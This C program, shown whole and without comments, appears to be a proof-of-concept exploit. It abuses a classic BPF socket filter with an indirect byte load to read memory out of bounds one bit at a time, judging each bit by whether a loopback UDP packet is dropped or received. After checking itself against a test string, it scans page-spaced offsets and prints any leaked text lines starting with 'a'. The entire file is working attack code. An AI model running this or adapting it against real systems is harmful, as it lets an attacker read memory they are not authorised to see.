#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <linux/filter.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#define TEST_STRING                                                            \
  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
static struct sockaddr_in addr;
static int snd_fd, rcv_fd;

static int leak_bit(int byte_offset, int bit_offset) {
  struct sock_filter code[] = {
      BPF_STMT(BPF_LDX | BPF_IMM, byte_offset),
      BPF_STMT(BPF_LD | BPF_B | BPF_IND, 0),
      BPF_STMT(BPF_ALU | BPF_AND | BPF_K, (1 << bit_offset)),
      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0, 1, 0),
      BPF_STMT(BPF_RET | BPF_K, -1),
      BPF_STMT(BPF_RET | BPF_K, 0), /* drop */
  };
  struct sock_fprog prog = {.len = sizeof(code) / sizeof(code[0]),
                            .filter = code};
  if (setsockopt(rcv_fd, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0)
    err(EXIT_FAILURE, "SO_ATTACH_FILTER");

  static unsigned char buf[1800] = TEST_STRING;
  if (sendto(snd_fd, buf, sizeof(buf), 0, (struct sockaddr *)&addr,
             sizeof(addr)) == -1)
    err(EXIT_FAILURE, "sendto");

  if (recv(rcv_fd, buf, sizeof(buf), 0) == -1) {
    if (errno != EAGAIN)
      err(EXIT_FAILURE, "recv");
    return 0;
  } else {
    return 1;
  }
}

static int leak_byte(int byte_offset) {
  int result = 0;
  for (int i = 0; i < 8; i++) {
    if (leak_bit(byte_offset, i))
      result |= (1 << i);
  }
  return result;
}

static void leak_buf(char *buf, size_t size, int byte_offset) {
  for (size_t i = 0; i < size; i++)
    buf[i] = leak_byte(byte_offset + i);
}

int main() {
  addr = (struct sockaddr_in){
      .sin_family = AF_INET,
      .sin_port = htons(12345),
      .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
  };

  snd_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (snd_fd < 0)
    err(EXIT_FAILURE, "snd_fd socket");

  rcv_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (rcv_fd < 0)
    err(EXIT_FAILURE, "rcv_fd socket");

  struct timeval tv = {.tv_sec = 0, .tv_usec = 11};
  if (setsockopt(rcv_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
    err(EXIT_FAILURE, "SO_RCVTIMEO");

  if (bind(rcv_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    err(EXIT_FAILURE, "bind");

  char test_buf[sizeof(TEST_STRING)];
  leak_buf(test_buf, sizeof(test_buf), 8);
  if (strcmp(test_buf, TEST_STRING) != 0)
    errx(EXIT_FAILURE, "TEST_STRING");

  for (int i = 0x580000 + 0x1000 - 0x24;; i += 0x1000) {
    if (leak_byte(i) == 'a') {
      for (int j = 0;; j++) {
        char c = leak_byte(i + j);
        if (c == 0 || c == '\n')
          break;
        putchar(c);
        fflush(stdout);
      }
      putchar('\n');
      fflush(stdout);
    }
  }
}
